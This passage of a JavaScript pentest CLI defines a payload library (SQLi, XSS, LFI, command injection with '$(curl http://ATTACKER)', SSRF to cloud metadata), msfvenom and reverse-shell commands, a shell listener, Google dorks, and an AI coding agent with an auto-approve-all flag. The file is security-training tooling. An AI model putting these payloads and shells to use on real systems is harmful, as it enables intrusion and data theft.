  console.log("  " + gray("windows exe ") + `msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=${ip} LPORT=${port} -f exe -o p.exe`);
  console.log("  " + gray("nc listener ") + `nc -lvnp ${port}`);
  console.log("  " + gray("http server ") + `python3 -m http.server 8000`);
  console.log("  " + gray("msf handler ") + `msfconsole -q -x "use exploit/multi/handler;set payload linux/x64/meterpreter/reverse_tcp;set LHOST ${ip};set LPORT ${port};run"`);
}
async function menuCheats() {
  h1("Cheat sheets");
  console.log("  topics: " + Object.keys(CHEATS).join(", ") + "\n");
  const t = await ask("topic:");
  const lines = CHEATS[t];
  console.log("");
  if (!lines) { console.log("  " + red("no such topic")); return; }
  lines.forEach((l) => console.log("  " + cyan("$ ") + l));
}
function listTools() {
  h1("Tools catalog");
  TOOLS.forEach(([n, cat, inst]) => console.log("  " + bold(n.padEnd(14)) + gray(cat.padEnd(10)) + inst));
  console.log("\n  " + gray("configure any tool with: ") + "sentinel setup <name>");
}
// Auto-configure a tool: run its install command, streaming output to the terminal.
function setupTool(name) {
  return new Promise((resolve) => {
    if (!name) { console.log("  " + red("usage: sentinel setup <tool>   e.g. sentinel setup nmap")); return resolve(); }
    const t = TOOLS.find((x) => x[0].toLowerCase() === String(name).toLowerCase());
    if (!t) { console.log("  " + red("unknown tool. see: sentinel tools")); return resolve(); }
    let inst = t[2];
    if (process.platform !== "win32" && inst.startsWith("sudo ") && process.getuid && process.getuid() !== 0 && process.env.SENTINEL_NO_PKEXEC !== "1") {
      // prefer a graphical prompt if available, else sudo will prompt in the terminal
    }
    h1("Configuring " + t[0]);
    console.log("  " + gray("first-time setup, this can take a few minutes...") + "\n  " + gray(inst) + "\n");
    const p = spawn(process.platform === "win32" ? "cmd.exe" : "/bin/bash", process.platform === "win32" ? ["/c", inst] : ["-lc", inst], { stdio: "inherit" });
    p.on("close", (code) => { console.log("\n  " + (code === 0 ? ok(t[0] + " is ready.") : red("setup exited with code " + code))); resolve(); });
    p.on("error", (e) => { console.log("  " + red("error: " + e.message)); resolve(); });
  });
}

// ---------- practice targets ----------
const PRACTICE = [
  ["dvwa", "DVWA", "SQLi / XSS / CSRF / command injection / file upload", "docker run --rm -it -p 4280:80 vulnerables/web-dvwa", "http://localhost:4280", "admin / password (then Setup > Create Database)"],
  ["juice", "OWASP Juice Shop", "OWASP Top 10 · modern JS · CTF-style", "docker run --rm -p 3000:3000 bkimminich/juice-shop", "http://localhost:3000", "register your own account"],
  ["webgoat", "OWASP WebGoat", "guided lessons · Java", "docker run --rm -p 8080:8080 -p 9090:9090 webgoat/webgoat", "http://localhost:8080/WebGoat", "register on first run"],
  ["bwapp", "bWAPP", "100+ bugs · PHP", "docker run --rm -p 8081:80 raesene/bwapp", "http://localhost:8081/install.php", "bee / bug (run /install.php once)"],
  ["mutillidae", "Mutillidae II (NOWASP)", "OWASP Top 10 · hints", "docker run --rm -p 8082:80 citizenstig/nowasp", "http://localhost:8082", "no login required"],
];
function labList() {
  h1("Practice targets");
  console.log("  " + gray("deliberately vulnerable apps — run locally with Docker. use only on systems you own.") + "\n");
  PRACTICE.forEach(([id, name, focus, cmd, url, creds]) => {
    console.log("  " + bold(cyan(id.padEnd(12))) + name);
    console.log("  " + " ".repeat(12) + gray(focus));
    console.log("  " + " ".repeat(12) + cmd);
    console.log("  " + " ".repeat(12) + gray("url ") + url + "   " + gray("login ") + creds + "\n");
  });
  console.log("  " + gray("tip: ") + "sentinel lab <id>" + gray("  prints one target's launch command"));
}
function labOne(id) {
  const t = PRACTICE.find((x) => x[0] === String(id).toLowerCase());
  if (!t) { console.log("  " + red("unknown target — try: " + PRACTICE.map((x) => x[0]).join(", "))); return; }
  h1(t[1]);
  console.log("  focus   " + t[2]);
  console.log("  launch  " + bold(t[3]));
  console.log("  url     " + t[4]);
  console.log("  login   " + t[5]);
}

// ---------- payload library ----------
const PAYLOADS_CLI = {
  sqli: ["' OR '1'='1", "' OR 1=1-- -", "admin'-- -", "' UNION SELECT NULL-- -", "1' AND SLEEP(5)-- -", "') OR ('1'='1", "'; DROP TABLE users-- -"],
  xss: ["<script>alert(1)</script>", "\"><svg onload=alert(1)>", "<img src=x onerror=alert(1)>", "javascript:alert(document.domain)", "'\"><script>alert(document.cookie)</script>"],
  lfi: ["../../../../etc/passwd", "..%2f..%2f..%2f..%2fetc%2fpasswd", "php://filter/convert.base64-encode/resource=index.php", "/proc/self/environ", "....//....//etc/passwd"],
  cmdi: ["; id", "| id", "$(id)", "`id`", "&& whoami", "; cat /etc/passwd", "$(curl http://ATTACKER)"],
  ssti: ["{{7*7}}", "${7*7}", "#{7*7}", "{{config}}", "<%= 7*7 %>", "{{''.__class__.__mro__[1].__subclasses__()}}"],
  ssrf: ["http://169.254.169.254/latest/meta-data/", "http://127.0.0.1:80", "file:///etc/passwd", "gopher://127.0.0.1:6379/_", "http://[::1]/"],
};
function printPayloads(cls) {
  if (cls && PAYLOADS_CLI[cls]) { h1("Payloads · " + cls); PAYLOADS_CLI[cls].forEach((p) => console.log("  " + p)); return; }
  if (cls) { console.log("  " + red("unknown class — try: " + Object.keys(PAYLOADS_CLI).join(", "))); return; }
  h1("Payload library");
  console.log("  " + gray("classes: " + Object.keys(PAYLOADS_CLI).join(", ")) + "\n");
  Object.entries(PAYLOADS_CLI).forEach(([k, arr]) => { console.log("  " + bold(cyan(k))); arr.forEach((p) => console.log("    " + p)); console.log(""); });
  console.log("  " + gray("for authorized testing only."));
}

// ---------- utilities: password gen, public IP, HTTP status ----------
function genPass(len) {
  len = Math.max(8, Math.min(128, parseInt(len, 10) || 20));
  const chars = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789!@#$%^&*-_=+";
  const bytes = crypto.randomBytes(len); let out = "";
  for (let i = 0; i < len; i++) out += chars[bytes[i] % chars.length];
  return out;
}
async function myIp() {
  const ctrl = new AbortController(); const t = setTimeout(() => ctrl.abort(), 8000);
  try { const r = await fetch("https://api.ipify.org?format=json", { signal: ctrl.signal }); const d = await r.json(); return d.ip || "(unknown)"; }
  catch (e) { return "error: " + (e.name === "AbortError" ? "timed out" : e.message); }
  finally { clearTimeout(t); }
}
const HTTP_STATUS_MAP = { "200": "OK", "201": "Created", "202": "Accepted", "204": "No Content", "206": "Partial Content", "301": "Moved Permanently", "302": "Found", "303": "See Other", "304": "Not Modified", "307": "Temporary Redirect", "308": "Permanent Redirect", "400": "Bad Request", "401": "Unauthorized", "402": "Payment Required", "403": "Forbidden", "404": "Not Found", "405": "Method Not Allowed", "406": "Not Acceptable", "407": "Proxy Authentication Required", "408": "Request Timeout", "409": "Conflict", "410": "Gone", "413": "Payload Too Large", "414": "URI Too Long", "418": "I'm a teapot", "422": "Unprocessable Entity", "425": "Too Early", "429": "Too Many Requests", "431": "Request Header Fields Too Large", "451": "Unavailable For Legal Reasons", "500": "Internal Server Error", "501": "Not Implemented", "502": "Bad Gateway", "503": "Service Unavailable", "504": "Gateway Timeout", "505": "HTTP Version Not Supported" };
function httpStatus(code) { code = String(code || "").trim(); const t = HTTP_STATUS_MAP[code]; return t ? bold(cyan(code)) + " " + t : red("unknown status code (try 200, 404, 500...)"); }

async function mainMenu() {
  banner();
  const items = [
    ["1", "Port scanner", menuScan],
    ["2", "DNS lookup", menuDns],
    ["3", "WHOIS", menuWhois],
    ["4", "HTTP security headers", menuHeaders],
    ["5", "TLS certificate", menuCert],
    ["6", "Subdomains (crt.sh)", menuSubs],
    ["v", "CVE search (NVD)", async () => { h1("CVE search"); const q = await ask("keyword / CVE-id:"); console.log(""); await cveSearch(q); }],
    ["f", "Content fuzzer", async () => { h1("Content fuzzer"); const u = await ask("url:"); console.log(""); await fuzz(u); }],
    ["7", "Reverse shell generator", menuShell],
    ["8", "Encode / decode / hash", menuEncode],
    ["9", "Payload builders", menuPayloads],
    ["p", "Payload library", async () => { const c = await ask("class (blank = all):"); console.log(""); printPayloads(c || undefined); }],
    ["l", "Practice targets", async () => labList()],
    ["x", "Password generator", async () => { const n = await ask("length (blank = 20):"); h1("Generated password"); console.log("  " + bold(genPass(n))); }],
    ["i", "My public IP", async () => { h1("Public IP"); console.log("  " + await myIp()); }],
    ["g", "GitHub (clone / push)", menuGit],
    ["c", "Cheat sheets", menuCheats],
    ["a", "Nexus — AI coder (local Ollama)", async () => aiCoder("")],
    ["t", "Tools catalog", async () => listTools()],
    ["0", "Exit", null],
  ];
  while (true) {
    console.log("");
    items.forEach(([k, label]) => console.log("  " + cyan("[" + k + "]") + " " + label));
    const choice = await ask("\n  select:");
    const item = items.find((i) => i[0] === choice);
    if (!item) { console.log("  " + red("invalid choice")); continue; }
    if (item[0] === "0") { console.log("\n  " + gray("stay sharp.") + "\n"); process.exit(0); }
    try { await item[2](); } catch (e) { console.log("  " + red("error: " + e.message)); }
    await ask("\n  " + gray("[enter] menu"));
    console.clear();
    banner();
  }
}

// ---------- extra utilities ----------
function cidr(input) {
  const m = String(input || "").trim().match(/^(\d{1,3}(?:\.\d{1,3}){3})\/(\d{1,2})$/);
  if (!m) { console.log(red("usage: sentinel cidr 192.168.1.0/24")); return; }
  const ip = m[1].split(".").map(Number), bits = +m[2];
  if (ip.some((o) => o > 255) || bits > 32) { console.log(red("invalid CIDR")); return; }
  const ipn = (((ip[0] << 24) >>> 0) + (ip[1] << 16) + (ip[2] << 8) + ip[3]) >>> 0;
  const mask = bits === 0 ? 0 : (0xffffffff << (32 - bits)) >>> 0;
  const net_ = (ipn & mask) >>> 0, bc = (net_ | (~mask >>> 0)) >>> 0;
  const toIp = (n) => [(n >>> 24) & 255, (n >>> 16) & 255, (n >>> 8) & 255, n & 255].join(".");
  const hosts = bits >= 31 ? (bits === 32 ? 1 : 2) : (bc - net_ - 1);
  h1("CIDR " + input);
  console.log("  Network    " + cyan(toIp(net_)));
  console.log("  Broadcast  " + cyan(toIp(bc)));
  console.log("  Netmask    " + toIp(mask));
  console.log("  Usable     " + toIp(bits >= 31 ? net_ : net_ + 1) + "  -  " + toIp(bits >= 31 ? bc : bc - 1));
  console.log("  Hosts      " + green(String(hosts)));
}
function jwtDecode(tok) {
  const p = String(tok || "").trim().split("."); if (p.length < 2) { console.log(red("not a JWT")); return; }
  const dec = (x) => JSON.stringify(JSON.parse(Buffer.from(x.replace(/-/g, "+").replace(/_/g, "/"), "base64").toString()), null, 2);
  try { h1("JWT"); console.log(gray("// header")); console.log(dec(p[0])); console.log(gray("\n// payload")); console.log(dec(p[1])); console.log(gray("\nsignature: ") + p[2] || ""); }
  catch (e) { console.log(red("invalid JWT: " + e.message)); }
}
async function ipInfo(ip) {
  const ctrl = new AbortController(); const t = setTimeout(() => ctrl.abort(), 8000);
  try {
    const r = await fetch("http://ip-api.com/json/" + encodeURIComponent(ip || ""), { signal: ctrl.signal });
    const d = await r.json();
    if (d.status !== "success") { console.log(red(d.message || "lookup failed")); return; }
    h1("IP " + d.query);
    [["Location", [d.city, d.regionName, d.country].filter(Boolean).join(", ")], ["ISP", d.isp], ["Org", d.org], ["AS", d.as], ["Coords", d.lat + "," + d.lon], ["Timezone", d.timezone]].forEach(([k, v]) => v && console.log("  " + k.padEnd(10) + cyan(v)));
  } catch (e) { console.log(red("error: " + (e.name === "AbortError" ? "timed out" : e.message))); }
  finally { clearTimeout(t); }
}
function dorks(domain) {
  if (!domain) { console.log(red("usage: sentinel dorks example.com")); return; }
  const D = [["exposed files", 'intitle:"index of"'], ["config/env", "ext:env | ext:ini | ext:conf"], ["SQL dumps", "ext:sql"], ["login pages", "inurl:login | inurl:admin"], ["docs", "ext:pdf | ext:xls | ext:docx"], ["errors", 'intext:"sql syntax near"'], ["backups", "ext:bak | ext:old | ext:backup"]];
  h1("Google dorks for " + domain);
  D.forEach(([label, q]) => { console.log("  " + bold(label)); console.log("  " + gray("https://www.google.com/search?q=") + encodeURIComponent("site:" + domain + " " + q) + "\n"); });
}
function fileHash(f) {
  try { const buf = require("fs").readFileSync(f); h1("Hashes of " + f); ["md5", "sha1", "sha256", "sha512"].forEach((a) => console.log("  " + a.padEnd(8) + cyan(crypto.createHash(a).update(buf).digest("hex")))); }
  catch (e) { console.log(red("error: " + e.message)); }
}
function serveDir(port, dir) {
  port = parseInt(port, 10) || 8000; dir = dir || ".";
  const fs = require("fs"), path = require("path");
  const srv = http.createServer((req, res) => {
    let p = path.join(dir, decodeURIComponent(req.url.split("?")[0]));
    if (!path.resolve(p).startsWith(path.resolve(dir))) { res.writeHead(403); return res.end("forbidden"); }
    fs.stat(p, (e, st) => {
      if (e) { res.writeHead(404); return res.end("not found"); }
      if (st.isDirectory()) { const items = fs.readdirSync(p); res.writeHead(200, { "Content-Type": "text/html" }); return res.end(items.map((i) => `<a href="${req.url.replace(/\/$/, "")}/${i}">${i}</a>`).join("<br>")); }
      console.log("  " + green("GET ") + req.url + gray("  " + (req.socket.remoteAddress || "")));
      res.writeHead(200); fs.createReadStream(p).pipe(res);
    });
  });
  srv.listen(port, () => { h1("HTTP file server"); console.log("  serving " + bold(path.resolve(dir)) + " on " + cyan("http://0.0.0.0:" + port)); console.log("  " + gray("Ctrl-C to stop") + "\n"); });
}
function listen(port) {
  port = parseInt(port, 10) || 4444;
  h1("Listener on :" + port);
  console.log("  " + gray("waiting for a connection (catch a reverse shell)... Ctrl-C to quit") + "\n");
  const srv = net.createServer((sock) => {
    console.log("  " + green("connection from ") + (sock.remoteAddress || "") + ":" + sock.remotePort + "\n");
    process.stdin.setRawMode && process.stdin.setRawMode(true); process.stdin.resume();
    sock.pipe(process.stdout); process.stdin.pipe(sock);
    sock.on("close", () => { console.log("\n  " + gray("connection closed")); process.exit(0); });
    sock.on("error", () => {});
  });
  srv.listen(port);
}

// ---------- one-shot CLI ----------
async function cli(args) {
  const [cmd, ...rest] = args;
  if (cmd === "scan") { const host = rest[0]; if (!host) return usage(); await scan(host, parsePorts(rest[1])); }
  else if (cmd === "dns") { const recs = await dnsLookup(rest[0] || ""); recs.forEach(([k, v]) => console.log(k.padEnd(6) + v)); }
  else if (cmd === "whois") { console.log(await whois(rest[0] || "")); }
  else if (cmd === "headers") { const r = await headers(rest[0] || ""); if (r.err) { console.log(r.err); return; } console.log(r.status + " server:" + r.server); SEC.forEach(([k, label]) => console.log((r.h[k] !== undefined ? "[+] " : "[-] ") + label)); }
  else if (cmd === "cert") { const c = await certInspect(rest[0] || ""); if (!c.ok) { console.log(c.error); return; } console.log("Protocol " + c.protocol + " " + c.cipher); console.log("Subject  " + c.subject); console.log("Issuer   " + c.issuer); console.log("Valid    " + c.valid_from + " -> " + c.valid_to + (c.daysLeft != null ? " (" + c.daysLeft + "d left)" : "")); console.log("SAN      " + c.san); console.log("SHA-256  " + c.fp); }
  else if (cmd === "subs") { const r = await subs(rest[0] || ""); if (r.err) { console.log(r.err); return; } r.forEach((s) => console.log(s)); }
  else if (cmd === "cve") await cveSearch(rest.join(" "));
  else if (cmd === "fuzz") await fuzz(rest[0], rest[1]);
  else if (cmd === "git") {
    const sub = rest[0];
    if (sub === "clone") await gitClone(rest[1] || "");
    else if (sub === "push") await gitPush(rest.slice(1).join(" "));
    else if (sub === "pull") await gitPull();
    else if (sub === "status") await gitStatus();
    else if (sub === "repos") await ghReposList();
    else if (sub === "new") await ghNewRepo(rest[1]);
    else if (sub === "branch") await gitBranches();
    else if (sub === "checkout") await gitCheckout(rest[1]);
    else if (sub === "log") await gitLog();
    else if (sub === "diff") await gitDiff(rest[1]);
    else if (sub === "issues") await ghIssues(rest[1], "issues");
    else if (sub === "prs") await ghIssues(rest[1], "pulls");
    else if (sub === "issue") await ghNewIssue(rest[1], rest[2], rest.slice(3).join(" "));
    else if (sub === "pr") await ghNewPR(rest[1], rest[2]);
    else if (sub === "comment") await ghComment(rest[1], rest[2], rest.slice(3).join(" "));
    else if (sub === "gists") await ghGists();
    else if (sub === "gist") await ghNewGist(rest[1], rest.slice(2).join(" "));
    else console.log("git clone|push|pull|status|log|diff|branch|checkout|repos|new|issues|prs|issue|pr|comment|gists|gist  (token: SENTINEL_GH_TOKEN)");
  }
  else if (cmd === "revshell") { const [lang = "bash", ip = "10.0.0.1", port = "4444"] = rest; console.log((SHELLS[lang] || SHELLS.bash)(ip, port)); }
  else if (cmd === "encode" || cmd === "decode") { const [type, ...v] = rest; const op = (type || "") + (cmd === "encode" ? "e" : "d"); const fn = ENC[op]; console.log(fn ? fn(v.join(" ")) : "unknown type (b64|hex|url)"); }
  else if (cmd === "hash") console.log(hashes(rest.join(" ")));
  else if (cmd === "hashid") console.log(idHash(rest.join(" ")));
  else if (cmd === "lab") { if (rest[0]) labOne(rest[0]); else labList(); }
  else if (cmd === "payloads") printPayloads(rest[0]);
  else if (cmd === "genpass") console.log(genPass(rest[0]));
  else if (cmd === "myip") console.log(await myIp());
  else if (cmd === "status") console.log(httpStatus(rest[0]));
  else if (cmd === "cidr") cidr(rest[0]);
  else if (cmd === "jwt") jwtDecode(rest[0]);
  else if (cmd === "ipinfo") await ipInfo(rest[0] || "");
  else if (cmd === "dorks") dorks(rest[0]);
  else if (cmd === "hashfile") fileHash(rest[0]);
  else if (cmd === "uuid") console.log(crypto.randomUUID());
  else if (cmd === "serve") { serveDir(rest[0], rest[1]); await new Promise(() => {}); }
  else if (cmd === "listen") { listen(rest[0]); await new Promise(() => {}); }
  else if (cmd === "cheats") { const t = rest[0]; if (t && CHEATS[t]) CHEATS[t].forEach((l) => console.log(l)); else console.log("topics: " + Object.keys(CHEATS).join(", ")); }
  else if (cmd === "tools") { h1("Tools"); TOOLS.forEach(([n, cat, inst]) => console.log("  " + bold(n.padEnd(14)) + gray(cat.padEnd(10)) + (inst.split(" ").slice(0,3).join(" ")))); console.log("\n  " + gray("configure any tool with: ") + "sentinel setup <name>"); }
  else if (cmd === "setup") await setupTool(rest[0]);
  else if (cmd === "init") nexusInit();
  else if (cmd === "nexus" || cmd === "code" || cmd === "ai") {
    const sub = (rest[0] || "").toLowerCase();
    if (sub === "init") nexusInit();
    else if (sub === "run" || sub === "supervise" || sub === "loop") await nexusRun(rest.slice(1));
    else if (sub === "overnight") await nexusRun(["--overnight"].concat(rest.slice(1)));
    else if (sub === "agents" || sub === "parallel") await nexusAgents(rest.slice(1));
    else await aiCoder(rest);
  }
  else usage();
}

// ---------- AI coder (terminal AI coding agent, local Ollama, dependency-free) ----------
function ollamaChat(model, messages, format, signal) {
  return new Promise((resolve, reject) => {
    const HOST = process.env.OLLAMA_HOST || "127.0.0.1", PORT = +(process.env.OLLAMA_PORT || 11434);
    const body = JSON.stringify({ model, stream: false, format, keep_alive: "30m", options: { temperature: 0.2, num_ctx: 16384 }, messages });
    const req = http.request({ host: HOST, port: PORT, path: "/api/chat", method: "POST", signal, headers: { "Content-Type": "application/json", "Content-Length": Buffer.byteLength(body) } },
      (res) => { let d = ""; res.on("data", (c) => (d += c)); res.on("end", () => { try { resolve(JSON.parse(d).message.content || ""); } catch (e) { reject(new Error("bad model response")); } }); });
    req.setTimeout(+(process.env.OLLAMA_TIMEOUT || 300000), () => { req.destroy(new Error("Ollama timed out (no response) — is the model stuck loading?")); }); // prevent a wedged request from hanging the turn forever
    req.on("error", (e) => reject(new Error("cannot reach Ollama at " + HOST + ":" + PORT + " — is it running? (" + e.message + ")"))); req.write(body); req.end();
  });
}
function ollamaTags() {
  return new Promise((resolve) => {
    const HOST = process.env.OLLAMA_HOST || "127.0.0.1", PORT = +(process.env.OLLAMA_PORT || 11434);
    http.get({ host: HOST, port: PORT, path: "/api/tags" }, (res) => { let d = ""; res.on("data", (c) => (d += c)); res.on("end", () => { try { resolve((JSON.parse(d).models || []).map((m) => m.name)); } catch (_) { resolve([]); } }); }).on("error", () => resolve([]));
  });
}
function pickCoderModel(ms) {
  const pri = ["qwen2.5-coder", "deepseek-coder", "codellama", "hermes3", "dolphin3", "llama3.1"];
  for (const p of pri) { const hit = ms.find((m) => m.toLowerCase().startsWith(p)); if (hit) return hit; }
  return ms.find((m) => /coder|code/i.test(m)) || ms[0] || "";
}
const CODER_SCHEMA = { type: "object", properties: { thought: { type: "string" }, action: { type: "string", enum: ["tool", "final"] }, tool: { type: "string" }, args: { type: "object" }, final: { type: "string" } }, required: ["thought", "action"] };
function coderShell(command, cwd) {
  return new Promise((resolve) => {
    const p = spawn(process.platform === "win32" ? "cmd.exe" : "/bin/sh", [process.platform === "win32" ? "/c" : "-c", command], { cwd });
    let out = ""; const cap = 12000;
    const add = (d) => { if (out.length < cap + 200) out += d.toString(); };
    const to = setTimeout(() => { try { p.kill("SIGKILL"); } catch (_) {} }, 120000);
    p.stdout.on("data", add); p.stderr.on("data", add);
    p.on("close", (code) => { clearTimeout(to); resolve({ code, output: out.length > cap ? out.slice(0, cap) + "\n...[truncated]" : (out || "(no output)") }); });
    p.on("error", (e) => { clearTimeout(to); resolve({ code: -1, output: "spawn error: " + e.message }); });
  });
}
function nexusHelp() {
  banner();
  console.log("  " + bold("Nexus") + " — terminal AI coding agent (local Ollama)\n");
  console.log("  " + bold("USAGE"));
  console.log("    sentinel nexus [options] [task]     one-shot task, or interactive REPL if no task given");
  console.log("    sentinel nexus                      interactive session\n");
  console.log("  " + bold("OPTIONS"));
  console.log("    -e, --engine <name>                claude (default if installed) | ollama | opencode");
  console.log("    -m, --model <name>                 ollama model (ollama engine)");
  console.log("    -y, --yes, --skip-permissions      auto-approve all file writes and commands");
  console.log("        --tui                          full-screen UI: scrolling chat + fixed input box (claude/opencode)");
  console.log("        --print                        headless: run one task, print the result, exit");
  console.log("    -h, --help                         show this help\n");
  console.log("  " + bold("IN-SESSION COMMANDS"));
  console.log("    /help          list commands           /model [name]  show or switch model");
  console.log("    /auto          toggle auto-approve      /clear         reset the conversation");
  console.log("    /undo          revert last file change  /diff          list files changed this session");
  console.log("    /exit          quit\n");
  console.log("  " + gray("Attach a file to a task with @path  —  e.g.  fix the bug in @src/app.js") + "\n");
  console.log("  " + bold("ENV") + "   SENTINEL_MODEL (default model) · OLLAMA_HOST / OLLAMA_PORT (remote Ollama)\n");
  console.log("  " + gray("Nexus reads & writes files and runs commands in the current folder. Local models only — private.") + "\n");
}

async function aiCoder(argv) {
  const fs = require("fs"), path = require("path");
  const cwd = process.cwd();
  // ---- parse flags ----
  const arr = Array.isArray(argv) ? argv.slice() : String(argv || "").split(/\s+/).filter(Boolean);
  let autoApprove = false, printMode = false, modelOverride = "", enginePref = "", tuiFlag = false, parts = [];
  for (let i = 0; i < arr.length; i++) {
    const a = arr[i];
    if (a === "-y" || a === "--yes" || a === "--skip-permissions" || a === "--dangerously-skip-permissions") autoApprove = true;
    else if (a === "--print") { printMode = true; autoApprove = true; }
    else if (a === "--tui" || a === "--ui") tuiFlag = true;
    else if (a === "-m" || a === "--model") modelOverride = arr[++i] || "";
    else if (a === "-e" || a === "--engine") enginePref = arr[++i] || "";
    else if (a === "-h" || a === "--help") return nexusHelp();
    else parts.push(a);
  }
  let cfg = {}; try { cfg = JSON.parse(fs.readFileSync(path.join(cwd, ".nexus", "config.json"), "utf8")); } catch (_) {}
  let nexusMd = ""; try { nexusMd = fs.readFileSync(path.join(cwd, ".nexus", "NEXUS.md"), "utf8"); } catch (_) {}
  const avail = { claude: hasBin("claude"), opencode: hasBin("opencode"), ollama: true };
  let engine = enginePref || cfg.engine || (avail.claude ? "claude" : "ollama");
  if (!avail[engine]) engine = "ollama";
  if (tuiFlag) {
    if (!process.stdout.isTTY) console.log("  " + gray("--tui needs an interactive terminal."));
    else return nexusTui(engine, cwd, nexusMd);
  }
  let model = null, modelList = [];
  if (engine === "ollama") { modelList = await ollamaTags(); if (!modelList.length) { if (!printMode) banner(); console.log("  " + red("No local model. Install Ollama + `ollama pull hermes3`, or use --engine claude.")); return; } model = modelOverride || cfg.model || process.env.SENTINEL_MODEL || pickCoderModel(modelList); }
  if (!printMode) {
    banner();
    const W = 56, bx = (s) => cyan("│ ") + s + " ".repeat(Math.max(0, W - 1 - s.length)) + cyan("│");
    const dir = cwd.length > W - 8 ? "…" + cwd.slice(-(W - 9)) : cwd;
    console.log("  " + cyan("╭" + "─".repeat(W) + "╮"));
    console.log("  " + bx("Nexus — AI coding agent"));
    console.log("  " + bx("engine: " + engine + (model ? "  (" + model + ")" : "  (Claude Code)")));
    console.log("  " + bx("dir:    " + dir));
    if (nexusMd) console.log("  " + bx("context: .nexus/NEXUS.md loaded"));
    console.log("  " + cyan("╰" + "─".repeat(W) + "╯"));
    console.log("  " + gray("message Nexus below · /help for commands · /exit to quit") + (autoApprove ? gray(" · auto-approve ON") : "") + "\n");
  }
  const SYS = "You are Nexus, a terminal AI coding agent working in " + cwd + " on the operator's own machine. Accomplish the task by taking ONE action per step and reading the OBSERVATION before the next. TOOLS: read_file{path}, write_file{path,content}, edit_file{path,find,replace} (replace one exact string), list_dir{path?}, run_command{command}. Reply with exactly ONE JSON object per the schema: {\"thought\",\"action\":\"tool\",\"tool\",\"args\"} or {\"thought\",\"action\":\"final\",\"final\"}. Write real, working code; prefer edit_file for small changes. Keep going until the task is fully done, then action:\"final\" with a short summary." + (nexusMd ? "\n\nPROJECT INSTRUCTIONS (.nexus/NEXUS.md):\n" + nexusMd.slice(0, 4000) : "");
  const messages = [{ role: "system", content: SYS }];
  let delegated = false;
  const changed = [];  // session change log for /undo and /diff: {path, before|null, label}
  const relp = (p) => path.relative(cwd, p) || p;
  // ---- permission gate (Glitch-style): confirm risky actions unless auto-approve ----
  async function approve(label) {
    if (autoApprove) return true;
    const ans = (await ask(cyan("  approve ") + label + gray("  [y]es / [n]o / [a]lways: "))).trim().toLowerCase();
    if (ans === "a" || ans === "always") { autoApprove = true; return true; }
    return ans === "" || ans === "y" || ans === "yes";
  }
  let task = parts.join(" ").trim();
  while (true) {
    if (!task) {
      if (printMode) return;
      const t = (await chatInput()).trim();
      if (!t) { task = ""; continue; }
      if (/^\/?(exit|quit|q)$/i.test(t)) { console.log("\n  " + gray("stay sharp.") + "\n"); return; }
      if (t === "/help") { nexusHelp(); continue; }
      if (t === "/auto") { autoApprove = !autoApprove; console.log("  " + gray("auto-approve " + (autoApprove ? "ON" : "OFF"))); continue; }
      if (t === "/clear") { messages.length = 1; console.log("  " + gray("conversation cleared")); continue; }
      if (t.startsWith("/model")) { const m = t.split(/\s+/)[1]; if (m) { model = m; console.log("  " + gray("model -> " + m)); } else console.log("  " + gray("model: " + (model || "(engine default)") + (modelList.length ? gray("  available: " + modelList.join(", ")) : ""))); continue; }
      if (t === "/undo") { const c = changed.pop(); if (!c) console.log("  " + gray("nothing to undo")); else try { if (c.isNew) { fs.unlinkSync(c.path); console.log("  " + gray("undid " + c.label + " (deleted new file)")); } else if (c.before != null) { fs.writeFileSync(c.path, c.before); console.log("  " + gray("undid " + c.label)); } else { console.log("  " + yellow("skipped undo of " + c.label + " — original contents weren't captured (file existed but was unreadable); not deleting it")); } } catch (e) { console.log("  " + red("undo failed: " + e.message)); } continue; }
      if (t === "/diff" || t === "/changed") { if (!changed.length) console.log("  " + gray("no changes this session")); else { console.log("  " + gray("changed this session:")); changed.forEach((c) => console.log("    " + relp(c.path) + (c.isNew ? gray("  (new)") : ""))); } continue; }
      if (t.startsWith("/")) { console.log("  " + gray("unknown command; try /help")); continue; }
      task = t;
    }
    // @path attaches a file's contents to the prompt (e.g. "fix the bug in @src/app.js")
    const userMsg = task.replace(/(^|\s)@(\S+)/g, (m, pre, p) => { try { const c = fs.readFileSync(path.resolve(cwd, p), "utf8"); return pre + "\n\n--- " + p + " ---\n" + c.slice(0, 12000) + "\n--- end " + p + " ---\n"; } catch (_) { return m; } });
    messages.push({ role: "user", content: userMsg }); task = "";
    console.log(cyan("  ▎ ") + bold("nexus") + gray("  " + engine) + "\n");
    if (engine !== "ollama") {
      await runEngineTask(engine, userMsg, cwd, autoApprove, delegated);
      delegated = true; console.log("");
      if (printMode) return;
      continue;
    }
    let didTool = false, nudges = 0;
    for (let step = 1; step <= 40; step++) {
      let raw; try { raw = await ollamaChat(model, messages, CODER_SCHEMA); } catch (e) { console.log("  " + red(e.message)); break; }
      let o; try { o = JSON.parse(raw); } catch (_) { messages.push({ role: "tool", content: "Reply with valid schema JSON only." }); continue; }
      messages.push({ role: "assistant", content: raw });
      if (o.thought && !printMode) console.log("  " + gray("- " + o.thought));
      if (o.action === "final") {
        if (!didTool && nudges++ < 3) { messages.push({ role: "tool", content: "You have not taken any action yet. Do the real work first." }); continue; }
        console.log("\n  " + green("done: ") + bold(o.final || "done") + "\n"); break;
      }
      const name = o.tool, a = o.args || {}; let result;
      try {
        if (name === "read_file") { const t = fs.readFileSync(path.resolve(cwd, a.path), "utf8"); result = { content: t.slice(0, 16000) }; if (!printMode) console.log("  " + cyan("read ") + a.path); }
        else if (name === "list_dir") { const d = path.resolve(cwd, a.path || "."); result = { items: fs.readdirSync(d, { withFileTypes: true }).map((e) => (e.isDirectory() ? e.name + "/" : e.name)).slice(0, 200) }; if (!printMode) console.log("  " + cyan("ls ") + (a.path || ".")); }
        else if (name === "write_file") {
          if (!(await approve("write " + a.path))) { result = { error: "denied by operator" }; console.log("  " + red("denied ") + a.path); }
          else { const fp = path.resolve(cwd, a.path); let before = null, isNew = false; try { before = fs.readFileSync(fp, "utf8"); } catch (e) { if (e.code === "ENOENT") isNew = true; } fs.mkdirSync(path.dirname(fp), { recursive: true }); fs.writeFileSync(fp, a.content == null ? "" : a.content); changed.push({ path: fp, before, isNew, label: "write " + a.path }); result = { ok: true }; console.log("  " + green("write ") + a.path + gray(" (" + String(a.content || "").split("\n").length + " lines" + (before != null ? ", was " + before.split("\n").length : "") + ")")); }
        }
        else if (name === "edit_file") {
          const fp = path.resolve(cwd, a.path); let t;
          try { t = fs.readFileSync(fp, "utf8"); } catch (_) { t = null; }
